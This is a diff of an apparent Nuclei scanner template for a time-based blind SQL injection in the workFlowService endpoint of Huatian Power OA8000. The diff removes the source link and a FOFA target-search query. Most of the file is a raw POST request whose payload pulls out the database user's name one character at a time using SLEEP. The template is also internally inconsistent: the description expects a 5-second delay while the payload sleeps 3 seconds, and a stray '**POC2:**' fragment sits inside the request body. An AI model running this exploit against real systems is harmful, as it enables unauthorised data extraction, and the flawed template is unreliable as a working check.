@@ -3,14 +3,8 @@ info:
   name: 华天动力OA workFlowService存在SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/cwkqc3sbngrvtdun
-
-    [!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 时间盲注: 命中条件为推断(duration>=5s), 请按实际 payload 延时核验。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: cwkqc3sbngrvtdun
-    fofa: app="华天动力-OA8000"
 http:
 - raw:
   - "POST /OAapp/bfapp/buffalo/workFlowService HTTP/1.1\nHost: {{Hostname}}\nAccept-Encoding: identity\nContent-Length: 168\nAccept-Language: zh-CN,zh;q=0.8\nAccept: */*\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\nAccept-Charset: GBK,utf-8;q=0.7,*;q=0.3\nConnection: keep-alive\nCache-Control: max-age=0\n\n<buffalo-call>\n  <method>\n     getAwokeListData\n  </method>\n  <string>\n     {\"k\":\"SELECT IF(ASCII(SUBSTRING((SELECT USER()),1,1))=114,SLEEP(3),0)\"}\n  </string>\n</buffalo-call>\n\n**POC2:**"
